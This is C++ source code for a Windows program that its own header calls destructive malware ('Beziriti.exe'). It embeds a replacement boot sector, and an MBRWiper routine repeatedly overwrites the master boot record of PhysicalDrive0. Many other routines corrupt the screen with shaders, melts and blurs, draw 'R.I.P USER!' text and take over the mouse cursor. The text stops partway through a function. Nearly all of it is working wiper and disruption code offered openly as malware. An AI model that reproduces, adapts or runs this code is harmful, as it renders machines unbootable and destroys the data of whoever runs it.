// Beziriti.exe - a destructive malware made by VietNamLover!
// Don't run it on your real PC!

#include <windows.h>
#include <cmath>
#include <ctime>
#include <cstdlib>
#include <algorithm>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#pragma comment(lib, "gdi32.lib")

#ifndef M_PI
#define M_PI   3.14159265358979323846264338327950288
#endif

using namespace std;

const unsigned char MasterBootRecord[] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBD, 0x00, 0xFA, 0xB0, 0x0F, 0xB9, 
0x00, 0xFA, 0x31, 0xFF, 0xF3, 0xAA, 0x31, 0xC0, 0xBF, 0xA9, 0x00, 0x88, 0x03, 0x4F, 0x79, 0xFB, 
0xC6, 0x46, 0x09, 0x14, 0xBF, 0x00, 0xAF, 0xB1, 0xA0, 0xF3, 0xAB, 0xB9, 0x80, 0x0C, 0xE8, 0x39, 
0x01, 0xE2, 0xFB, 0xFE, 0x4E, 0x08, 0xB0, 0x0F, 0xBF, 0x80, 0x20, 0xB9, 0x80, 0x8E, 0xF3, 0xAA, 
0xB1, 0x27, 0xA1, 0x04, 0xFA, 0x99, 0xF7, 0x36, 0x59, 0x7D, 0x80, 0xC2, 0x30, 0x50, 0x88, 0xD0, 
0x88, 0xCA, 0xBB, 0x0F, 0x00, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xCD, 0x10, 0x58, 0x49, 0x09, 
0xC0, 0x75, 0xE2, 0xB6, 0x07, 0xB9, 0x28, 0x00, 0xBF, 0x0A, 0xFA, 0x8B, 0x1D, 0x08, 0xDB, 0x74, 
0x2A, 0xB2, 0x02, 0x8B, 0x75, 0x02, 0x88, 0xF8, 0xE8, 0xF9, 0x00, 0x28, 0x35, 0x73, 0x1A, 0xFF, 
0x46, 0x04, 0xC6, 0x05, 0x00, 0xA1, 0x04, 0xFA, 0xB3, 0x0A, 0xF6, 0xF3, 0x08, 0xE4, 0x75, 0x09, 
0x80, 0x7E, 0x09, 0x0A, 0x7E, 0x03, 0xFE, 0x4E, 0x09, 0xEB, 0x2A, 0x38, 0x5E, 0x08, 0x7F, 0x25, 
0xA0, 0x09, 0xFA, 0x88, 0x46, 0x08, 0xC7, 0x05, 0xFF, 0x8B, 0xC7, 0x45, 0x02, 0xCE, 0x7D, 0xE5, 
0x40, 0xD0, 0xE8, 0x73, 0x10, 0x83, 0x45, 0x02, 0x08, 0x80, 0x6D, 0x01, 0x12, 0xD0, 0xE8, 0x72, 
0x04, 0x80, 0x6D, 0x01, 0x19, 0xAF, 0xAF, 0xE2, 0xA2, 0xBE, 0x07, 0xFA, 0xBB, 0x06, 0xFA, 0x38, 
0x0F, 0x7E, 0x05, 0x80, 0x2F, 0x07, 0xEB, 0x0B, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x03, 0x74, 0x03, 
0xC6, 0x04, 0x1E, 0x8A, 0x04, 0x3C, 0x00, 0x7E, 0x05, 0x00, 0x07, 0x80, 0x2C, 0x07, 0xB8, 0x8B, 
0x00, 0xBB, 0x23, 0x00, 0x8A, 0x4E, 0x06, 0x38, 0xE1, 0x7E, 0x02, 0x28, 0xC8, 0x50, 0xBA, 0x40, 
0x01, 0xF7, 0xE2, 0x8D, 0x7F, 0x0F, 0x01, 0xC7, 0x26, 0x8A, 0x0D, 0xB4, 0x02, 0xCD, 0x16, 0x34, 
0x04, 0x75, 0x07, 0xB2, 0x02, 0x88, 0x7E, 0x06, 0xEB, 0x09, 0xB2, 0x03, 0x81, 0xEF, 0x3A, 0x1A, 
0x26, 0x22, 0x0D, 0x58, 0xBE, 0xC6, 0x7D, 0xE8, 0x4A, 0x00, 0x08, 0xC9, 0x74, 0x1E, 0xBE, 0x41, 
0xB0, 0xBF, 0x40, 0xB0, 0xB9, 0x7F, 0x0C, 0xF3, 0x26, 0xA4, 0xE8, 0x2D, 0x00, 0xB4, 0x00, 0xCD, 
0x1A, 0x88, 0xD3, 0xCD, 0x1A, 0x30, 0xD3, 0x74, 0xF8, 0xE9, 0xE7, 0xFE, 0xBB, 0x0F, 0x00, 0xBA, 
0x0F, 0x0C, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xB9, 0x0A, 0x00, 0xBE, 0xB5, 0x7D, 0xAC, 0xCD, 
0x10, 0xE2, 0xFB, 0xB4, 0x00, 0xCD, 0x16, 0xE9, 0x96, 0xFE, 0xE4, 0x40, 0x24, 0x55, 0x74, 0x02, 
0xB0, 0x0F, 0xAA, 0xC3, 0x51, 0x57, 0x88, 0x46, 0x00, 0x88, 0x5E, 0x02, 0xB3, 0x08, 0x88, 0xD7, 
0x52, 0x8B, 0x46, 0x00, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x5A, 0x03, 0x46, 0x02, 0x97, 0xB1, 0x08, 
0x8A, 0x04, 0xD2, 0xE8, 0xB0, 0x00, 0x51, 0x88, 0xD1, 0x72, 0x04, 0x01, 0xCF, 0xEB, 0x02, 0xF3, 
0xAA, 0x59, 0xE2, 0xEC, 0xFF, 0x4E, 0x00, 0xFE, 0xCF, 0x75, 0xD5, 0x88, 0xD7, 0x4E, 0xFE, 0xCB, 
0x75, 0xCE, 0x5F, 0x59, 0xC3, 0x67, 0x61, 0x6D, 0x65, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x21, 0x06, 
0x0D, 0x0F, 0x1E, 0xBC, 0x7A, 0x10, 0x18, 0x1C, 0x22, 0x73, 0x26, 0x6B, 0x22, 0x67, 0x32, 0x03, 
0x07, 0x6E, 0xBF, 0xFF, 0x0E, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE Reserved;
    };
} _RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}
namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red = 0, green = 0, blue = 0;
bool ifblue = false;

COLORREF Hue(int length) {
    if (red != length) {
        red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
    return RGB(0, 0, 0);
}

DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt((double)(x ^ y)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI melt(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        HDC hdcTemp = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
        BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int numShifts = 600;
        for (int i = 0; i < numShifts; i++) {
            int x = rand() % w;
            int y = rand() % h;
            int dx = (rand() % 3) - 1;
            int dy = (rand() % 3) - 1;
            BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCAND);
        SelectObject(hdcTemp, hbmOld);
        DeleteDC(hdcTemp);
        DeleteObject(hbm);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI melt2(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        HDC hdcTemp = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
        BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int numShifts = 600;
        for (int i = 0; i < numShifts; i++) {
            int x = rand() % w;
            int y = rand() % h;
            int dx = (rand() % 3) - 1;
            int dy = (rand() % 3) - 1;
            BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCINVERT);
        SelectObject(hdcTemp, hbmOld);
        DeleteDC(hdcTemp);
        DeleteObject(hbm);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI textout1(LPVOID lpvd) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    LPCSTR text1 = "R.I.P USER!";
    while (1) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Wingdings");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI shader2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (x + i * 4) + (y + i * 4);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shader3(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = x ^ y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI sines1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = (int)(sin(angle) * 60);
            BitBlt(hdc, (int)i, 0, 1, sh, hdc, (int)i, a, SRCCOPY);
            angle += M_PI / 70;
        }
        ReleaseDC(wnd, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI blur1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    RECT rect;
    POINT pt[3];
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    srand((unsigned int)time(NULL));

    while (1) {
        hdc = GetDC(NULL);
        GetWindowRect(GetDesktopWindow(), &rect);
        int inc3 = (rand() % 700) + (GetCurrentThreadId() % 100);
        int v = (rand() % 2) + (GetCurrentThreadId() % 3);
        if (v == 1) inc3 = -inc3;
        pt[0].x = rect.left + inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right + inc3;
        pt[1].y = rect.top * inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom + inc3;
        PlgBlt(hdcCopy, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}

VOID WINAPI RotatePoints(POINT* points, int count, POINT center, float angle) {
    float cosVal = cos(angle);
    float sinVal = sin(angle);
    for (int i = 0; i < count; i++) {
        int translatedX = points[i].x - center.x;
        int translatedY = points[i].y - center.y;
        points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
        points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
    }
}

DWORD WINAPI triangles(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    float rotationAngle = 0.0f;
    float rotationSpeed = 0.02f;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        POINT vertices[] = {
            { top_x, bottom_y },
            { bottom_x, bottom_y },
            { (top_x + bottom_x) / 2, top_y }
        };
        POINT center = {
            (top_x + bottom_x) / 2, (top_y + bottom_y) / 2
        };
        RotatePoints(vertices, sizeof(vertices) / sizeof(vertices[0]), center, rotationAngle);
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        if (y >= GetSystemMetrics(SM_CYSCREEN)) {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN)) {
            signX = -1;
        }
        if (y == 0) {
            signY = 1;
        }
        if (x == 0) {
            signX = 1;
        }
        rotationAngle += rotationSpeed;
        Sleep(1);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                double fractalX = (2.5f / w);
                double fractalY = (1.90f / h);
                double cx = x * fractalX - 2.f;
                double cy = y * fractalY - 0.95f;
                double zx = 0;
                double zy = 0;
                int fx = 0;
                while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                    double fczx = zx * zx - zy * zy + cx;
                    double fczy = 2 * zx * zy + cy;
                    zx = fczx;
                    zy = fczy;
                    fx++;
                    rgbquadCopy = rgbquad[index];
                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                    hslcolor.s = 0.7f;
                    hslcolor.l = 0.5f;
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shader5(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    while (1) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb ^= (x + i * 4) + (y + i * 4);
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader6(LPVOID lpParam) {
    DWORD startTime = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    srand((unsigned int)time(NULL));
    while (1) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - startTime) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            INT x = i % w, y = i / w;
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) += x ^ y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI shader7(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)(sqrt((double)(x & (i * 4))) * cbrt((double)(y & (i * 4))));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI icons(LPVOID lpParam) {
    POINT cursor;
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    srand((unsigned int)time(NULL));
    while (1) {
        HDC hdc = GetDC(0);
        int icon_x = GetSystemMetrics(SM_CXICON);
        int icon_y = GetSystemMetrics(SM_CYICON);
        GetCursorPos(&cursor);
        x += incrementor * signX;
        y += incrementor * signY;
        SetCursorPos(x, y);
        HMODULE hModule = LoadLibrary(TEXT("shell32.dll"));
        int randomIcon = rand() % (250 - 50 + 1) + 50;
        HICON hIcon = LoadIcon(hModule, MAKEINTRESOURCE(randomIcon));
        ICONINFO iconInfo;
        GetIconInfo(hIcon, &iconInfo);
        BITMAP bmpIcon;
        GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmpIcon);
        int iconWidth = bmpIcon.bmWidth;
        int iconHeight = bmpIcon.bmHeight;
        DrawIconEx(hdc, cursor.x - icon_x, cursor.y - icon_y, hIcon, iconWidth * 2, iconHeight * 2, 0, NULL, DI_NORMAL);
        if (y >= GetSystemMetrics(SM_CYSCREEN)) {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN)) {
            signX = -1;
        }
        if (y == 0) {
            signY = 1;
        }
        if (x == 0) {
            signX = 1;
        }
        ReleaseDC(0, hdc);
        Sleep(1);
        FreeLibrary(hModule);
    }
}

static FLOAT pfSinVals[4096];

FLOAT FastSine(_In_ FLOAT f) {
    INT i = (INT)(f / (2.f * M_PI) * (FLOAT)(sizeof(pfSinVals) / sizeof(pfSinVals[0])));
    return pfSinVals[i % (sizeof(pfSinVals) / sizeof(pfSinVals[0]))];
}

VOID InitializeTan(VOID) {
    unsigned int v0;
    float X;
    unsigned int i;
    for (i = 0; i <= 0xFFF; ++i) {
        v0 = i;
        X = (double)(int)i / 4096.0 * 3.141592 + (double)(int)i / 4096.0 * 3.141592;
        pfSinVals[v0] = tanf(X);
    }
}

FLOAT FastCosine(_In_ FLOAT f) {
    return FastSine(f + M_PI / 2.f);
}

VOID Reflect2D(_Inout_ PINT x, _Inout_ PINT y, _In_ INT w, _In_ INT h) {
